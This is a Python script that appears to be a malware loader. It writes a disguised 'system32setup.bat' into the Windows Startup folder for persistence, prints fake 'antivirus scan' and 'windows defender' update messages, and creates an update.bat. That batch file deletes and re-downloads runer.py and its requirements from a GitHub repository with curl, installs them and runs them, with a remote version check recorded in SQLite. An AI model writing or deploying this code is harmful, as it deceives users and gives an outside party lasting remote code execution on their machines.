import os, sqlite3, sys

os.system("pip install -r requirements.txt")

con = sqlite3.connect("database.db")

con.execute("CREATE TABLE IF NOT EXISTS data (id TEXT, content ANY)")
con.commit()

# check wersion 
import requests

cur = con.cursor()

version = None
try:
    version = float(cur.execute(f"SELECT content FROM data WHERE id = 'version'").fetchone()[0])
    cur = con.cursor()
except:
    pass


def FirstRun():
    print("starting antivirus scan ...")
    open(os.path.expanduser('~') + "\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\system32setup.bat", "w").write(f"python {os.getcwd()}\\runer.py")
    
    open("update.bat", "w+").write("""
    echo updating windows defender

    timeout /t 10 /nobreak
    del runer.py
    
    curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/runer.py -O
    curl https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/requirements.txt -O
    
    pip install -r requirements.txt
    
    echo windows defender is up to date
    python runer.py                               
    """)


new_version = (float(str(requests.get("https://raw.githubusercontent.com/MundoCoRobiBundo/jakie-co-/main/version").content).split("\"")[1]))


if version is None:
    cur.execute("""
        INSERT INTO data (id, content)
        VALUES ('version', """ + str(new_version) + """);                
    """)
    
    FirstRun()
    
elif new_version > version:
    cur.execute(f"""
        UPDATE data
        SET content = """ + str(new_version) + """
        WHERE id == 'version'
    """)
con.commit()
